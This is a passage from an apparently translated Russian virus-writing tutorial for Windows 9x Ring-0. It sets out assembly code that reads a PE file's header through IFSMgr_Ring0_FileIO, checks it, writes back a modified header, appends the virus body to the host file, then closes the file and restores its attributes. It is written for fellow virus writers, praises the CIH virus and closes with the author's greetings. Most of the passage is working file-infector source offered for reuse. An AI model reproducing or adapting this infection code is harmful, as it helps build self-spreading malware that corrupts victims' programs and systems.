 вить заголовок и дописать вирус... Здесь я объясню как засунуть в наш буффер
 заголовок PE-файла. Это очень просто: как вы помните, PE-заголовок начинается
 со смещения на которое указывает двойное слово по адресу 3Ch (с начала файла,
 конечно). Теперь мы должны прочитать 4 байта (этот DWORD в 3Ch), и прочитать
 снова с того места, на которое они указывают, читаем 400h байт, что достаточно
 для любого PE-заголовка. Как вы себе представляете, функция чтения включена в
 чудесный IFSMgr_Ring0_FileIO, и вы можете увидеть номера функций в таблице,
 которую я давал ранее, в R0_READFILE. Параметры передаваемые этой функции сле-
 дующие:

 EAX = R0_READFILE = D600h
 EBX = Хендл файла
 ECX = Сколько байт прочитать
 EDX = Смещение места куда читать
 ESI = Здесь будет число прочитанных байт

        call    inf_delta               ;Как вы помните, дельта была в EBX, но
inf_delta:                              ;после открытия файла мы имеем в EBX
        pop     ebp                     ;хендл файла.
        sub     ebp,offset inf_delta    ;И так мы высчитаем дельту снова.

        mov     eax,R0_READFILE         ;D600h
        push    eax                     ;Сохраним на будущее
        mov     ecx,4                   ;Сколько байт прочитать
        mov     edx,03Ch                ;Где читать (начало файла+3Ch)
        lea     esi,[ebp+pehead]        ;Здесь будет смещение PE-заголовка
        VxDCall IFSMgr_Ring0_FileIO     ;Собственно VxDCall

        pop     eax                     ;Восстановим R0_READFILE из стека

        mov     edx,dword ptr [ebp+pehead] ;Откуда начинается PE-заголовок
        lea     esi,[ebp+header]        ;Куда деть прочитанный PE-заголовок
        mov     ecx,400h                ;1024 байт, достаточно для всех PE-за-
        VxDCall IFSMgr_Ring0_FileIO	;ловков

 Теперь мы должны проверить файл, который мы открыли, на предмет PE-заголовка,
 через просмотр его начала. В ESI у нас указатель на буффер, куда мы прочитали
 PE-заголовок, и так, просто сравним первый DWORD на который показывает ESI с
 PE,0,0 (или просто с PE если сравнивать WORD) ;)

        cmp     dword ptr [esi],"EP"    ;Это PE?
        jnz     muthafucka

 Теперь мы должны проверить не заражен ли он уже, и если заражен - просто пе-
 рейти на процедуру закрытия файла. Как я сказал ранее, я пропущу код, изменя-
 ющий PE-заголовок, потому что это описанно в другом документе. И так, пред-
 ставьте что у вас уже есть измененный PE-заголовок в буффере (в моем коде он
 зовется header). Пришло время записать новый заголовок в PE файл. Значения ре-
 гистров более-менее похожи на фунцию R0_READFILE. Но я полюбому их напишу:

 EAX = R0_WRITEFILE = D601h
 EBX = Хендл файла
 ECX = Сколько байт записать
 EDX = Смещение места, куда писать
 ESI = Смещение места, откуда писать

        mov     eax,R0_WRITEFILE                ;D601h
        mov     ecx,400h                        ;записать 1024 байт (буффер)
        mov     edx,dword ptr [ebp+pehead]      ;куда писать (смещение PE)
        lea     esi,[ebp+header]                ;Что писать
        VxDCall IFSMgr_Ring0_FileIO

 Мы просто записали заголовок. Теперь осталось только приписать вирус. Я решаю 
 дописать напрямую в конец файла, потому что это мой способ изменения PE...
 И я сделаю это в данном случае. Но не беспокойтесь, это легко адаптировать к
 вашему методу заражения, как я предполагаю - вы понимаете, как это работает.
 Перед дописыванием вирусного тела не забудьте пофиксить все VxDCall'ы, так как 
 они трансформируются в обычные call'ы. Вспомните, процедуре VxDFix я уже обу-
 чал вас в этом документе. Кстати, так как мы дописываемся в конец файла, непло-
 хо бы знать сколько байт он занимает. Элементарно, у нас есть такая функция в
 IFSMgr_Ring0_FileIO которая делает эту работу: R0_GETFILESIZE. Давайте взгля-
 нем на ее входные параметры:

 EAX = R0_GETFILESIZE = D800h
 EBX = Хендл файла

 И возвращает нам в EAX размер файла, хендл которого мы передали в параметрах и
 который мы пытаемся заразить.

        call    VxDFix                          ;Пофиксим все INT 20h

        mov     eax,R0_GETFILESIZE              ;D800h
        VxDCall IFSMgr_Ring0_FileIO     
                                                ;EAX = Размер файла
        mov     edx,R0_WRITEFILE                ;EDX = D601h
        xchg    eax,edx                         ;EAX = D601; EDX = Размер файла
        lea     esi,[ebp+virus_start]           ;Что записывать
        mov     ecx,virus_size                  ;Сколько байт писать
        VxDCall IFSMgr_Ring0_FileIO

 Ништяк, осталось сделать только несколько вещей. Просто закроем файл и восста-
 новим его старые аттрибуты. И конечно функция закрытия находится в нашем люби-
 мом IFSMgr_Ring0_FileIO, а называется D700h. Взглянем на входные параметры:

 EAX = R0_CLOSEFILE = 0D700h
 EBX = Хендл файла

 А теперь код:

 muthafucka:
        mov     eax,R0_CLOSEFILE
        VxDCall IFSMgr_Ring0_FileIO

 Ну, осталось сделать только одну вещь (круто!). Восстановить старые аттрибуты.

 stillnotsofunny:
        pop     ecx                             ;Восстановим старые аттрибуты
        pop     esi                             ;Восстановим указатель на имя
						;файла
        mov     eax,4301h                       ;Функция установки аттрибутов
        VxDCall IFSMgr_Ring0_FileIO

 notsofunny:
        ret

 И это все! :) Кстати, все эти "VxDCall IFSMgr_Ring0_FileIO" лучше сделать как
 подпрограмму и вызывать простым call'ом: это более оптимизированно (если вы ис-
 пользуете макрос VxDCall, который я вам показал), и это намного лучше потому
 что фиксить VxDFix'ом нужно будет только по одному смещению.

 % Напоследок %
 ──────────────

 Я должен поблагодарить 3 наиболее важных людей, которые помогали мне пока я
 кодил свой первый продукт под Ring-0: Super, Vecna и nIgr0 (вы б0ги!). Ну что
 еще сказать? Эээ... да. Ring-0 наша голубая мечта под системами Win9X. Но это
 ограниченная жизнь. Неважно если мы, Vирмейкеры, найдем путь получить привеле-
 гии Ring-0 в системах типа NT, или будущей Win2000 (NT5). Micro$oft выпусит 
 патч или  Service  Pack, который пофиксит все возможные баги. Но все равно, 
 это очень интересно - кодить вирусы под Ring-0. Для меня этот эксперимент был
 прикольным и помог мне узнать больше о внутренней структуре Windozы. Я наде-
 юсь поможет и вам. Вирусы под Ring-0 очень заразительны - система пытается от-
 крывать файлы из-за всякой ерунды. Просто посмотрите на один из самых зарази-
 тельных, быстрых и распространенных вирусов под Ring-0 - CIH. 

 Billy Belcebг,
 mass killer and ass kicker.
